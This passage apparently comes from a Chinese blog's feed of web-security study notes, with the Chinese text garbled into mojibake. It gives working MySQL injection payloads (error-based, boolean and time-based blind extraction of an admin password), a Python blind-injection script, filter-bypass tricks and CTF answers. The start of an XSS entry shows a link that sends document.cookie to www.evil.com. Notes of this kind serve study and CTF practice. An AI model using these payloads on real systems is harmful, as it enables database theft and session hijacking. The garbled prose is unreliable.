æ³•çœ‹åˆ°ä¸ä¹‹ç›¸å…³çš„ä»»ä½•æ–‡ä»¶ã€‚</p><p>å…¶ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯ï¼Œ<strong>information_schema</strong>çš„æ•°æ®åº“é‡Œçš„<strong>shemata</strong>æ•°æ®è¡¨æŸ¥è¯¢<strong>å…¨éƒ¨æ•°æ®åº“å</strong></p><p><strong>tables</strong>çš„æ•°æ®è¡¨ä¸­å­˜ç€å…¨éƒ¨çš„<strong>æ•°æ®è¡¨ä¿¡æ¯</strong>ã€‚å…¶ä¸­ï¼Œ<strong>table_name å­—æ®µä¿å­˜å…¶åç§°</strong>ï¼Œ<strong>table_schemaä¿å­˜å…¶å¯¹åº”çš„æ•°æ®åº“å</strong>ã€‚</p><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.5.5~5.5.49</p><p>&emsp;&emsp;æŠ¥é”™æ³¨å…¥æœ‰è”åŠ¨expå’Œ~çš„ï¼Œåœ¨Mysqlé‡Œå¤´ï¼Œexpå°±æ˜¯å–eçš„å¹‚æ¬¡, ~å°±æ˜¯æŒ‰ä½å–åã€‚å½“expé‡Œå¤´çš„å€¼å¤ªå¤§äº†ï¼Œå°±ä¼šé€ æˆå¤§æ•´æ•°æº¢å‡ºï¼Œä»è€ŒæŠ¥é”™ã€‚</p><p><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code></p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>å‡½æ•°è¯­æ³•ï¼šupdatexml(XML_document, Xpath_string, new_value);</p><p>é€‚ç”¨ç‰ˆæœ¬: 5.1.5+<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>æˆ‘ä»¬é€šå¸¸åœ¨ç¬¬äºŒä¸ªXpathå‚æ•°å¡«å†™æˆ‘ä»¬è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p><p>ä¸exp()ä¸åŒï¼Œupdatexmlæ˜¯ç”±äºå‚æ•°çš„æ ¼å¼ä¸æ­£ç¡®è€Œäº§ç”Ÿçš„é”™è¯¯ï¼ŒåŒæ ·ä¹Ÿä¼šè¿”å›å‚æ•°çš„ä¿¡æ¯ã€‚</p><p>payload:</p><p>å‰åæ·»åŠ ~ä½¿å…¶ä¸ç¬¦åˆXpathæ ¼å¼ä»è€ŒæŠ¥é”™ã€‚<br><code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p><code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p><p>é€šè¿‡æŸ¥è¯¢@@version,è¿”å›ç‰ˆæœ¬ã€‚ç„¶åCONCATå°†å…¶å­—ç¬¦ä¸²åŒ–ã€‚å› ä¸ºUPDATEXMLç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²,æ‰€ä»¥ä¸ç¬¦åˆè¦æ±‚ï¼Œç„¶åæŠ¥é”™ã€‚</p><p>é”™è¯¯å¤§æ¦‚ä¼šæ˜¯ï¼š<br>ERROR 1105 (HY000): XPATH syntax error: â€™:root@localhostâ€™<br>å¦å¤–ï¼Œupdatexmlæœ€å¤šåªèƒ½æ˜¾ç¤º32ä½ï¼Œéœ€è¦é…åˆsubstrã€ç”¨æ³•ï¼šsubstr(string,start,length)ã€‘ä½¿ç”¨ã€‚</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>å‡½æ•°è¯­æ³•ï¼š<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.1.5+</p><p>åˆ©ç”¨åŸç†ä¸updatexmlå‡½æ•°ç›¸åŒ</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h4 id="å‡ ä½•å‡½æ•°"><a href="#å‡ ä½•å‡½æ•°" class="headerlink" title="å‡ ä½•å‡½æ•°"></a>å‡ ä½•å‡½æ•°</h4><ul><li>GeometryCollectionï¼š<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygon()ï¼š<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint()ï¼š<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring()ï¼š<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestring()ï¼š<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygon() ï¼š<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h4 id="ä¸å­˜åœ¨çš„å‡½æ•°"><a href="#ä¸å­˜åœ¨çš„å‡½æ•°" class="headerlink" title="ä¸å­˜åœ¨çš„å‡½æ•°"></a>ä¸å­˜åœ¨çš„å‡½æ•°</h4><p>éšä¾¿é€‚ç”¨ä¸€é¢—ä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šå¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°ã€‚</p><p><a href="https://img.0x002.com/article/MysqlSQLi/noExit.png" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/noExit.png" alt="ä¸å­˜åœ¨çš„å‡½æ•°æŠ¥é”™"></a></p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><h4 id="å¸ƒå°”"><a href="#å¸ƒå°”" class="headerlink" title="å¸ƒå°”"></a>å¸ƒå°”</h4><p>&emsp;&emsp;å¯¹äºå¸ƒå°”ç›²æ³¨æ¥è¯´ï¼Œå…¶ä½¿ç”¨çš„åœºæ™¯åœ¨äºï¼š<strong>å¯¹çœŸ/å‡æ¡ä»¶è¿”å›çš„å†…å®¹å¾ˆå®¹æ˜“åŒºåˆ†</strong>ã€‚</p><p>&emsp;&emsp;æ¯”å¦‚è¯´ï¼Œæœ‰è¿™ä¹ˆä¸€æ¡æ­£å¸¸çš„selectè¯­å¥ï¼Œæˆ‘ä»¬å†èµ·whereæ¡ä»¶åè¾¹åŠ ä¸Šand 1=2ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œ1æ°¸è¿œä¸ç­‰äº2ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¡ä»¶å°±æ˜¯ä¸€ä¸ªæ°¸å‡æ¡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨andè¯­å¥è¿ä¸Šï¼Œé‚£ä¹ˆæ•´ä¸ªwhereéƒ¨åˆ†å°±æ˜¯æ°¸å‡çš„ï¼Œè¿™æ—¶å€™selectè¯­å¥æ˜¯ä¸ä¼šè¿”å›å†…å®¹çš„ã€‚å°†å…¶è¿”å›çš„å†…å®¹ä¸æ­£å¸¸é¡µé¢è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœå¾ˆå®¹æ˜“åŒºåˆ†çš„è¯ï¼Œé‚£ä¹ˆå¸ƒå°”ç›²æ³¨è¯•ç”¨ã€‚</p><p>payloadï¼š<code>(where | and) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)</code></p><h4 id="æ—¶é—´"><a href="#æ—¶é—´" class="headerlink" title="æ—¶é—´"></a>æ—¶é—´</h4><p>&emsp;&emsp;ç›¸æ¯”è¾ƒäºå¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ä¾èµ–äºé€šè¿‡<strong>é¡µé¢è¿”å›çš„å»¶è¿Ÿæ—¶é—´</strong>æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®ã€‚</p><p>ä½¿ç”¨åœºæ™¯ï¼šå¸ƒå°”ç›²æ³¨æ°¸å‡æ¡ä»¶æ‰€è¿”å›çš„å†…å®¹ä¸æ­£å¸¸è¯­å¥è¿”å›çš„å†…å®¹å¾ˆæ¥è¿‘/ç›¸åŒï¼Œæ— æ³•åˆ¤æ–­æƒ…å†µã€‚</p><p>ç®€å•çš„æ¥è¯´ï¼Œæ—¶é—´ç›²æ³¨å°±æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰çš„æ¡ä»¶ä¸ºå‡çš„è¯ï¼Œæˆ‘ä»¬è®©å…¶0å»¶è¿Ÿé€šè¿‡ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸçš„è¯ï¼Œä½¿ç”¨sleep()ç­‰å‡½æ•°ï¼Œè®©sqlè¯­å¥çš„è¿”å›äº§ç”Ÿå»¶è¿Ÿã€‚</p><p>payloadï¼š<code>ï¼ˆwhere | andï¼‰if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1)</code></p><p>&emsp;&emsp;ç”±äºç›²æ³¨æ˜¯éœ€è¦å¤§é‡çš„æµ‹è¯•æ¯”è¾ƒå¤šçš„æ•°æ®ï¼Œæ‰€ä»¥ä¸€èˆ¬ç›²æ³¨éƒ½æ˜¯å†™è„šæœ¬çš„ã€‚ä¸ç„¶ä¸€ä¸ªä¸€ä¸ªæ‰‹å·¥ç›²æµ‹è´¹æ—¶è´¹åŠ›ã€‚</p><p>ä¸‹é¢æ˜¯æ—¶é—´ç›²æ³¨è„šæœ¬çš„ä¸€ä¸ªç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table=<span class="string">"abcdefghijklmnopqrstuvwxyz_&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        ss = time.time()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'''ELT(left((select database()),&#123;&#125;)='&#123;&#125;&#123;&#125;',SLEEP(10))'''</span>.format(len(flag)+<span class="number">1</span>,flag, i)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="comment">#print(time.time()-ss)</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-ss&gt;=<span class="number">10</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>é™¤äº†ä¸‰ç§æ³¨å…¥ï¼Œå…¶å®è¿˜æœ‰ä¸€äº›ä¸å¸¸è§çš„æ³¨å…¥</p><h3 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h3><p>&emsp;&emsp;ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Ÿç®€å•çš„è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…æ„é€ çš„æ¶æ„payloadé¦–å…ˆä¼šè¢«æœåŠ¡å™¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œåœ¨ä¹‹åå–å‡ºæ•°æ®åº“åœ¨è¿›è¡ŒSQLè¯­å¥æ‹¼æ¥æ—¶äº§ç”Ÿçš„SQLæ³¨å…¥é—®é¢˜ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼ŒæŸä¸ªæŸ¥è¯¢å½“å…ˆç™»å½•çš„ç”¨æˆ·ä¿¡æ¯çš„SQLè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">'$_SESSION['</span>username']'</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;ç™»å½•/æ³¨å†Œå¤„çš„SQLè¯­å¥éƒ½ç»è¿‡äº†addslasheså‡½æ•°ã€å•å¼•å·é—­åˆçš„å¤„ç†ï¼Œä¸”æ— ç¼–ç äº§ç”Ÿçš„é—®é¢˜ã€‚</p><p>&emsp;&emsp;å¯¹äºä¸Šè¿°ä¸¾çš„è¯­å¥æˆ‘ä»¬å¯ä»¥å…ˆæ³¨å†Œä¸€ä¸ªåä¸º<code>admin&#39; #</code>çš„ç”¨æˆ·åï¼Œå› ä¸ºåœ¨æ³¨å†Œè¿›è¡Œäº†å•å¼•å·çš„è½¬ä¹‰ï¼Œæ•…æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è¿›è¡Œinsertæ³¨å…¥ï¼Œæœ€ç»ˆå°†æˆ‘ä»¬çš„ç”¨æˆ·åå­˜å‚¨åœ¨äº†æœåŠ¡å™¨ä¸­ï¼Œæ³¨æ„ï¼šåæ–œæ è½¬ä¹‰æ‰äº†å•å¼•å·ï¼Œåœ¨mysqlä¸­å¾—åˆ°çš„æ•°æ®å¹¶æ²¡æœ‰åæ–œæ çš„å­˜åœ¨ã€‚</p><p>&emsp;&emsp;åœ¨æˆ‘ä»¬è¿›è¡Œç™»å½•æ“ä½œçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”¨æ³¨å†Œçš„<code>admin&#39; #</code>ç™»å½•ç³»ç»Ÿï¼Œå¹¶å°†ç”¨æˆ·éƒ¨åˆ†æ•°æ®å­˜å‚¨åœ¨å¯¹äºçš„SESSIONä¸­ï¼Œå¦‚<code>$_SESSION[&#39;username&#39;]</code>ã€‚</p><p>&emsp;&emsp;ä¸Šè¿°çš„<code>$_SESSION[&#39;username&#39;]</code>å¹¶æ²¡æœ‰ç»è¿‡å¤„ç†ï¼Œç›´æ¥æ‹¼æ¥åˆ°äº†SQLè¯­å¥ä¹‹ä¸­ï¼Œå°±ä¼šé€ æˆSQLæ³¨å…¥ï¼Œæœ€ç»ˆçš„è¯­å¥ä¸ºï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">'admin'</span> #'</span><br></pre></td></tr></table></figure><p>å¸¸è§æ³¨å…¥æ–¹å¼çš„åŸºç¡€åŸç†è®²å®Œäº†ï¼Œæ¥ä¸‹æ¥å°±è®²è®²ï¼Œæ€ä¹ˆå»ç»•è¿‡ä¸€äº›è€ƒè™‘ä¸å‘¨åˆ°çš„è¿‡æ»¤ã€‚</p><h3 id="å…³é”®å­—è¿‡æ»¤"><a href="#å…³é”®å­—è¿‡æ»¤" class="headerlink" title="å…³é”®å­—è¿‡æ»¤"></a>å…³é”®å­—è¿‡æ»¤</h3><p>è¿‡å¦‚é‡åˆ°æ›¿æ¢ä¸ºç©ºçš„æƒ…å†µï¼Œä¸”ä¸æ˜¯é€’å½’æ£€æŸ¥ï¼Œå°±å¯ä»¥ç”¨åŒå†™ç»•è¿‡</p><p>åˆ©ç”¨&amp;&amp;ã€||å¯ä»¥ä»£æ›¿andå’Œorï¼Œ+å·ï¼Œ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'||1='<span class="number">1</span>     <span class="meta">#or</span></span><br><span class="line">'&amp;&amp;1='<span class="number">1</span>     <span class="meta">#and</span></span><br></pre></td></tr></table></figure><p>æ³¨é‡Š(/**/)å¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œ%09, %0a, %0b, %0c, %0d, %a0ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼</p><p>å¦‚ï¼š<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><p>é€—å·è¢«è¿‡æ»¤ï¼šsubstr(data from 1 for 1)ç›¸å½“äºsubstr(data,1,1)ã€limit 9 offset 4ç›¸å½“äºlimt 9,4</p><p>ä¸»è¦æ€è·¯å°±ä½¿ç”¨åŒä¹‰å‡½æ•°/è¯­å¥ä»£æ›¿ï¼Œå¦‚ifå‡½æ•°å¯ç”¨case when condition then 1 else 0 endè¯­å¥ä»£æ›¿ã€‚</p><p>å¦‚æœå•ç‹¬è¿‡æ»¤union,ä½¿ç”¨ç›²æ³¨æ¥è·å–æ•°æ®</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'and substr((<span class="name">select</span> pass from users limit <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)='s</span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›å°Trick"><a href="#ä¸€äº›å°Trick" class="headerlink" title="ä¸€äº›å°Trick"></a>ä¸€äº›å°Trick</h3><p>è¿™é‡Œè·Ÿå¤§å®¶åˆ†äº«ä¸€äº›æœ‰æ„æ€çš„Trickï¼Œä¸»è¦åœ¨ä¸€äº›CTFé¢˜å‡ºç°ï¼Œè¿™é‡Œä¹ŸæŠŠå®ƒè®°ä¸‹æ¥ï¼Œæ–¹ä¾¿å¤ä¹ ã€‚</p><h4 id="PHP-union-select-igç»•è¿‡ã€‚"><a href="#PHP-union-select-igç»•è¿‡ã€‚" class="headerlink" title="PHP/union.+?select/igç»•è¿‡ã€‚"></a>PHP<code>/union.+?select/ig</code>ç»•è¿‡ã€‚</h4><p>åœ¨æŸäº›é¢˜ç›®ä¸­ï¼Œé¢˜ç›®ç¦æ­¢unionä¸selectåŒæ—¶å‡ºç°æ—¶ï¼Œä¼šç”¨æ­¤æ­£åˆ™æ¥åˆ¤æ–­è¾“å…¥æ•°æ®ã€‚</p><ul><li>åˆ©ç”¨ç‚¹ï¼š<a href="https://bugs.php.net/bug.php?id=70699" target="_blank" rel="noopener">PHPæ­£åˆ™å›æº¯BUG</a></li><li>å…·ä½“åˆ†ææ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></li></ul><blockquote><p>PHPä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™<code>pcre.backtrack_limit</code>ã€‚è‹¥æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ä½¿å¾—PHPè¿›è¡Œå›æº¯ä¸”æ­¤æ•°è¶…è¿‡äº†è§„å®šçš„å›æº¯ä¸Šé™æ­¤æ•°(é»˜è®¤ä¸º 100ä¸‡)ï¼Œé‚£ä¹ˆæ­£åˆ™åœæ­¢ï¼Œè¿”å›æœªåŒ¹é…åˆ°æ•°æ®ã€‚</p></blockquote><p>æ•…è€Œæˆ‘ä»¬æ„é€ payloadï¼š<code>union/*100ä¸‡ä¸ªaï¼Œå……å½“åƒåœ¾æ•°æ®*/select</code>å³å¯ç»•è¿‡æ­£åˆ™åˆ¤æ–­ã€‚</p><p>ä¸€é“ç›¸å…³çš„CTFé¢˜ï¼š<a href="https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020" target="_blank" rel="noopener">TetCTF-2020 WP BY MrR3boot</a></p><h4 id="LIMITä¹‹åçš„å­—æ®µæ•°åˆ¤æ–­"><a href="#LIMITä¹‹åçš„å­—æ®µæ•°åˆ¤æ–­" class="headerlink" title="LIMITä¹‹åçš„å­—æ®µæ•°åˆ¤æ–­"></a>LIMITä¹‹åçš„å­—æ®µæ•°åˆ¤æ–­</h4><p>æˆ‘ä»¬éƒ½çŸ¥é“è‹¥æ³¨å…¥ç‚¹åœ¨whereå­è¯­å¥ä¹‹åï¼Œåˆ¤æ–­å­—æ®µæ•°å¯ä»¥ç”¨<code>order by</code>æˆ–<code>group by</code>æ¥è¿›è¡Œåˆ¤æ–­ï¼Œè€Œ<code>limit</code>åå¯ä»¥åˆ©ç”¨ <code>into @,@</code> åˆ¤æ–­å­—æ®µæ•°ï¼Œå…¶ä¸­@ä¸ºmysqlä¸´æ—¶å˜é‡ã€‚</p><p><a href="https://img.0x002.com/article/MysqlSQLi/limitInto.png" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/limitInto.png" alt="img"></a></p><h3 id="å®ä¾‹ï¼š"><a href="#å®ä¾‹ï¼š" class="headerlink" title="å®ä¾‹ï¼š"></a>å®ä¾‹ï¼š</h3><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQLã€ä¸‡èƒ½å¯†ç ã€‘</p><p><code>admin&#39; or 1=1 #</code></p><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]loveSQLã€åŸºç¡€è”åˆæ³¨å…¥ã€‘</p><p><code>?username=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</code></p><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]babySQLã€åŒå†™ç»•è¿‡ã€‘</p><p><code>?username=admin&amp;password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</code></p><p>PSï¼šè¿™ä¹ˆçœ‹æ¥æƒ³è¦æ³¨å…¥ï¼Œæˆ‘ä»¬å¿…é¡»è¦ç”¨åˆ°å•å¼•å·æˆ–è€…åŒå¼•å·æ¥é€ƒé€¸å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¿‡æ»¤å¼•å·å°±èƒ½é˜²ä½SQLæ³¨å…¥äº†ä¹ˆï¼Ÿå¹¶ä¸æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªä¾‹å­</p><p>&emsp;&emsp;å¦‚æœä½ åªæ˜¯è¿‡æ»¤äº†å•å¼•å·ï¼ŒæŒ‰ç…§ä½ ä¸Šé¢çš„sqlè¯­å¥ã€<code>String sql=&quot;select * from user_table where username=&#39;&quot;+name+&quot;&#39; and password=&#39;&quot;+password+&quot;&#39;&quot;;</code>ã€‘ï¼Œä¾ç„¶æ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚</p><p>&emsp;&emsp;usernameè¿™æ ·è¾“å…¥ï¼š<code>1\</code></p><p>&emsp;&emsp;passwordè¿™æ ·è¾“å…¥ï¼š<code>or 1=1;#</code></p><p>&emsp;&emsp;ç»è¿‡ä½ çš„ç¨‹åºä¹‹åsqlè¯­å¥å˜æˆè¿™æ ·select * from user_table where username=â€™1&#39; and password=â€™or 1=1;#â€™; åœ¨è¿™é‡Œï¼Œusernameä¸­è¾“å…¥çš„\è½¬ä¹‰äº†å®ƒåé¢çš„å•å¼•å·ï¼Œå› æ­¤sqlè¯­å¥å®é™…ä¸Šå˜æˆ usernameçš„å€¼ç­‰äºè¿™æ ·ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š 1â€™ and password=ï¼Œåé¢æˆ‘å†æ¥or 1=1;#å°±ç”Ÿæ•ˆäº†ï¼Œ</p>]]></content>
      
      
      <categories>
          
          <category> Webå°å±‹ </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webå­¦ä¹ ç¬”è®° ä¹‹ XSS</title>
      <link href="/2020/07/26/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BXSS/"/>
      <url>/2020/07/26/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BXSS/</url>
      
        <content type="html"><![CDATA[<h2 id="æŒ‡ä»¤ã€æ•°æ®"><a href="#æŒ‡ä»¤ã€æ•°æ®" class="headerlink" title="æŒ‡ä»¤ã€æ•°æ®"></a>æŒ‡ä»¤ã€æ•°æ®</h2><p>&emsp;&emsp;Webä¸–ç•Œæ˜¯ç”±æ•°æ®æ„æˆçš„ï¼Œè€Œå­˜å‚¨ã€ä¼ è¾“ã€å±•ç¤ºå‡ºè¿™äº›æ•°æ®åˆ™éœ€è¦æŒ‡ä»¤çš„æ‰§è¡Œã€‚åˆé€‚çš„æŒ‡ä»¤åœ¨åˆé€‚çš„ç¯å¢ƒä¸‹è§£é‡Šæ‰§è¡Œï¼Œä»è€Œäº§ç”Ÿåˆé€‚çš„æ•°æ®å†…å®¹ã€‚æ¯”å¦‚<code>select username,email from user where id = 1;</code>,è¿™æ˜¯ä¸€æ¡SQLæŸ¥è¯¢æŒ‡ä»¤ï¼Œå½“è¿™æ¡æŒ‡ä»¤è¢«æ•°æ®åº“å¼•æ“è§£é‡Šæ‰§è¡Œæ—¶å°±ä¼šäº§ç”Ÿä¸€ç»„æ•°æ®ï¼Œå†…å®¹ç”±usernameã€emailæ„æˆã€‚å†å¦‚<code>&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt;</code> <code>&lt;script&gt;&lt;/script&gt;</code>æ ‡ç­¾å†…æ˜¯ä¸€å¥JavaScriptæŒ‡ä»¤ï¼Œç”±æµè§ˆå™¨çš„JSå¼•æ“æ¥è§£é‡Šæ‰§è¡Œï¼Œè§£é‡Šçš„ç»“æœå°±æ˜¯æ•°æ®ã€‚è€Œå®ƒæœ¬èº«åˆ™æ˜¯ä¸€ä¸ªHTMLæ ‡ç­¾ï¼Œç”±æµè§ˆå™¨çš„DOMå¼•æ“æ¸²æŸ“æ‰§è¡Œã€‚</p><p>&emsp;&emsp;å¦‚æœæŒ‡ä»¤å’Œæ•°æ®å®Œå…¨ç‹¬ç«‹ï¼Œé‚£æ˜¾ç„¶æ˜¯å¤ªå¹³ç››ä¸–ï¼Œç„¶è€Œå¦‚æœæ­£å¸¸çš„è¾“å…¥æ•°æ®è¢«æ³¨å…¥äº†æŒ‡ä»¤ï¼Œå¹¶ä¸”åœ¨è§£é‡Šçš„è¿‡ç¨‹ä¸­æŒ‡ä»¤è¿˜è¢«ç‹¬ç«‹æ‰§è¡Œäº†ï¼Œé‚£ä¹ˆæ”»å‡»å°±å‘ç”Ÿäº†ã€‚</p><p>&emsp;&emsp;å¦‚æœ<a href="http://www.evil.com/info.htmlçš„ä»£ç å†…å®¹ä¸º`" target="_blank" rel="noopener">www.evil.com/info.htmlçš„ä»£ç å†…å®¹ä¸º`</a><script>eval(location.hash.substr(1));</script>`</p><p>&emsp;&emsp;æˆ‘ä»¬æ„é€ å¦‚ä¸‹é“¾æ¥<code>http://www.evil.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</code></p><p>&emsp;&emsp;é‚£ä¹ˆæµè§ˆå™¨å°±ä¼šè§£é‡Šæ‰§è¡Œ<code>eval(locaion.hash.substr(1));</code>å˜ä¸º<code>eval(&#39;new Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)&#39;)</code>  </p><p>&emsp;&emsp;å½“è¢«æ”»å‡»è€…è¢«è¯±éª—ç‚¹äº†è¯¥é“¾æ¥æ—¶ï¼ŒCookiesä¼šè¯ä¿¡æ¯å°±ä¼šè¢«ä¼ åˆ°é»‘å®¢ç½‘ç«™ä¸Šã€‚</p><p>&emsp;&emsp;æ”»å‡»çš„å‘ç”Ÿï¼Œæ˜¯å› ä¸ºé€šè¿‡urlæ³¨å…¥äº†ä¸€æ®µæ¶æ„çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”è¯¥æŒ‡ä»¤èƒ½è¢«æ‰§è¡Œã€‚</p><h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>&emsp;&emsp;åŒæºç­–ç•¥æœ‰å‡ 